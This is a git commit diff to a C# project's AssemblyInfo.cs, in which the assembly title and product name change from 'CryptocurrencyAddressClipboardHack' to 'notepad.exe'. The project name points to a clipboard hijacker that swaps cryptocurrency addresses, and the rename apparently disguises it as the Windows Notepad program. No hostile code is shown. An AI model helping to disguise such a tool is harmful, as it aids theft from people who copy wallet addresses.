e068e4e6209c52f0c943cf05781d17962466b943
Maxi Sandoval <maxisandoval98@gmail.com>
2023-05-25 18:57:10 -0300

    updated app info

--- Properties/AssemblyInfo.cs
+++ Properties/AssemblyInfo.cs
@@ -5,11 +5,11 @@ using System.Runtime.InteropServices;
 // La información general de un ensamblado se controla mediante el siguiente 
 // conjunto de atributos. Cambie estos valores de atributo para modificar la información
 // asociada a un ensamblado.
-[assembly: AssemblyTitle("CryptocurrencyAddressClipboardHack")]
+[assembly: AssemblyTitle("notepad.exe")]
 [assembly: AssemblyDescription("")]
 [assembly: AssemblyConfiguration("")]
 [assembly: AssemblyCompany("")]
-[assembly: AssemblyProduct("CryptocurrencyAddressClipboardHack")]
+[assembly: AssemblyProduct("notepad.exe")]
 [assembly: AssemblyCopyright("Copyright ©  2023")]
 [assembly: AssemblyTrademark("")]
 [assembly: AssemblyCulture("")]
